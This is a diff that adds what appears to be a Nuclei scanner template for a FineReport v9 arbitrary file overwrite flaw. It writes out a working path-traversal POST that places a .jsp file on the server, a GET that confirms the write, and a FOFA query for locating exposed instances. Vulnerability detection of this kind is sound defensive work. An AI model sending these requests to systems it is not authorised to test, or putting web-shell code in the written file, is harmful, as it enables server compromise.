@@ -1,0 +1,35 @@
+id: fine-report-v9-file-upload
+
+info:
+  name: FineReport v9 Arbitrary File Overwrite
+  author: SleepingBag945
+  severity: critical
+  reference:
+    - https://github.com/NHPT/WebReportV9Exp/blob/main/WebReport_Exp.
+  metadata:
+    fofa-query: app="帆软-FineReport"
+    max-request: 2
+  tags: finereport,fileupload,intrusive
+
+variables:
+  string: '{{rand_base(8, "abc")}}'
+  filename: '{{rand_base(8)}}'
+
+http:
+  - raw:
+      - |
+        POST /WebReport/ReportServer?op=svginit&cmd=design_save_svg&filePath=chartmapsvg/../../../../WebReport/{{filename}}.jsp HTTP/1.1
+        Host: {{Hostname}}
+        Content-Type: text/xml;charset=UTF-8
+
+        {"__CONTENT__":"{{string}}","__CHARSET__":"UTF-8"}
+
+      - |
+        GET /WebReport/{{filename}}.jsp HTTP/1.1
+        Host: {{Hostname}}
+
+    matchers:
+      - type: word
+        part: body_2
+        words:
+          - "{{string}}"
